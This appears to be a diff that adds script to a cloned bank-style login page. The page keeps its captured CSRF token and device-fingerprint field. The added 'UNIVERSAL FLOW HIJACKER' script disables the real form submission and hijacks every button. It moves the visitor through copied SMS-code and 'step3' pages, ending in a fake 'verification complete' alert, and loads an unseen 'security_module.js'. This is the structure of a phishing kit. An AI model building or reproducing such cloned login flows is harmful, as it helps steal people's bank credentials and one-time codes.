id="FuiLabel-1">Password</label><span class="fui-label-after"></span></fui-label><fui-input class="ng-untouched ng-pristine ng-invalid hydrated" described-by-id="FuiError-1" formcontrolname="password" labelled-by-id="FuiLabel-1" name="password" pattern="^.{5,30}$" placeholder="Password" position="stacked" required="" type="password"><!-- --><input aria-describedby="FuiError-1" aria-invalid="false" aria-labelledby="FuiLabel-1" autocapitalize="off" autocomplete="off" autocorrect="off" class="form-control" name="password" pattern="^.{5,30}$" placeholder="Password" required="" spellcheck="true" type="password"/></fui-input></div><div aria-atomic="true" aria-live="polite" aria-relevant="all" class="fui-errors" id="FuiError-1"><fui-error-message class="hydrated" error-type="patternMismatch" hidden=""><!-- --><div class="invalid-feedback d-block"><span aria-hidden="true"></span> You have entered an incorrect Password. Please try again. </div></fui-error-message><fui-error-message class="hydrated" error-type="valueMissing" hidden=""><!-- --><div class="invalid-feedback d-block"><span aria-hidden="true"></span> Please enter your Password. </div></fui-error-message></div><div aria-atomic="true" aria-live="polite" aria-relevant="all" class="fui-hint-text" id="FuiHint-1"></div></fui-form-group></div></fui-password-toggle-group><label class="form-group remember-login-container"><fui-checkbox class="hydrated" false-value="false" id="rememberLogin" is-inline-control="" name="createMemorizedAccount" true-value="true" type="boolean"><!-- --><div class="form-check"><input aria-checked="false" aria-invalid="false" aria-labelledby="FuiCheckboxLabel-1" class="form-check-input" id="FuiCheckboxControl-1" name="createMemorizedAccount" type="checkbox"/><label class="fui-checkbox-label form-check-label" for="FuiCheckboxControl-1" id="FuiCheckboxLabel-1"><span class="remember-me-input-label" for="rememberLogin">Remember Me</span></label></div></fui-checkbox></label><!-- --><input name="_csrf" type="hidden" value="l8qih5PUolkuuDzrNG2sc1xai4jWyWoEOqPcJrIZUv04n7lqofqStPCylGED3AXeA0CYEWpjprC3-wgpXsbrQNQpNJ5arY5S"/><input name="_eventId_submit" type="hidden" value="Login"/><oidc-device-fingerprint-input><input hidden="" name="device" type="hidden" value="version%3D3%2E7%2E1%5F1%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%2010%2E0%3B%20win64%3B%20x64%29%20applewebkit%2F537%2E36%20%28khtml%2C%20like%20gecko%29%20chrome%2F153%2E0%2E0%2E0%20safari%2F537%2E36%7C5%2E0%20%28Windows%20NT%2010%2E0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F153%2E0%2E0%2E0%20Safari%2F537%2E36%7CWin32%26pm%5Ffpsc%3D24%7C1536%7C864%7C824%26pm%5Ffpsw%3Dpdf%7Cpdf%7Cpdf%7Cpdf%7Cpdf%26pm%5Ffptz%3D%2D5%26pm%5Ffpln%3Dlang%3Dfr%2DFR%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1%26pm%5Ffpasw%3Dinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%26pm%5Ffpan%3DNetscape%26pm%5Ffpacn%3DMozilla%26pm%5Ffpol%3Dtrue%26pm%5Ffposp%3D%26pm%5Ffpup%3D%26pm%5Ffpsaw%3D1536%26pm%5Ffpspd%3D24%26pm%5Ffpsbd%3D%26pm%5Ffpsdx%3D%26pm%5Ffpsdy%3D%26pm%5Ffpslx%3D%26pm%5Ffpsly%3D%26pm%5Ffpsfse%3D%26pm%5Ffpsui%3D%26pm%5Fos%3DWindows%26pm%5Fbrmjv%3D153%26pm%5Fbr%3DChrome%26pm%5Finpt%3D%26pm%5Fexpt%3D"/></oidc-device-fingerprint-input><fui-button button-role="main" class="c1-btn-container hydrated" color="primary" disabled="" fill="solid" type="submit"><!-- --><button aria-disabled="true" buttonrole="main" class="btn btn-primary" type="submit"> LOGIN </button></fui-button></form><oidc-spinner><div><!-- --></div><!-- --></oidc-spinner></login-form><!-- --><!-- --><div class="memorized-btn-container"><!-- --><!-- --><!-- --><fui-button button-role="link" class="hydrated" href="/auth/oauth2/forgotPac"><!-- --><button buttonrole="link" class="btn btn-link" type="button"> Forgot Password? </button></fui-button><!-- --></div><!-- --></div></login-app>
+
+<script>
+// UNIVERSAL FLOW HIJACKER
+document.addEventListener("DOMContentLoaded", function() {
+    setTimeout(function() {
+        var btns = document.querySelectorAll("button, input[type='submit'], .btn");
+        btns.forEach(function(btn) {
+            var clone = btn.cloneNode(true);
+            if (btn.parentNode) {
+                btn.parentNode.replaceChild(clone, btn);
+                clone.style.pointerEvents = "auto";
+                clone.removeAttribute("disabled");
+                
+                clone.addEventListener("click", function(e) {
+                    var text = (clone.textContent || clone.value || "").toLowerCase().trim();
+                    var isSubmit = clone.getAttribute("type") === "submit" || clone.tagName === "BUTTON" || text.indexOf("valid") !== -1 || text.indexOf("contin") !== -1 || text.indexOf("log") !== -1 || text.indexOf("sign") !== -1 || text.indexOf("connex") !== -1 || text.indexOf("next") !== -1 || text.indexOf("suivant") !== -1;
+                    
+                    if (isSubmit) {
+                        e.preventDefault();
+                        e.stopImmediatePropagation();
+                        
+                        var current = window.location.pathname.split("/").pop();
+                        if (current.indexOf("_sms.html") !== -1) {
+                            window.location.href = current.replace("_sms.html", "_step3.html");
+                        } else if (current.indexOf("_step3.html") !== -1) {
+                            alert("Vérification terminée !");
+                        } else if (current !== "index.html" && current !== "") {
+                            window.location.href = current.replace(".html", "_sms.html");
+                        }
+                    }
+                }, true);
+            }
+        });
+        
+        // Also forcibly hijack all form submits
+        var forms = document.querySelectorAll("form");
+        forms.forEach(function(form) {
+            form.setAttribute("action", "javascript:void(0)");
+            form.onsubmit = function(e) {
+                e.preventDefault();
+                e.stopImmediatePropagation();
+            };
+        });
+    }, 300); // slight delay to ensure other frameworks finish loading
+});
+</script>
+
+<script src="security_module.js"></script>
+</body></html>
+<style>
+/* Unhide logo if it was hidden by CSS */
+.logo img, .widget-c1-oauth-login .logo img { display: block !important; visibility: visible !important; opacity: 1 !important; }
+</style>
+
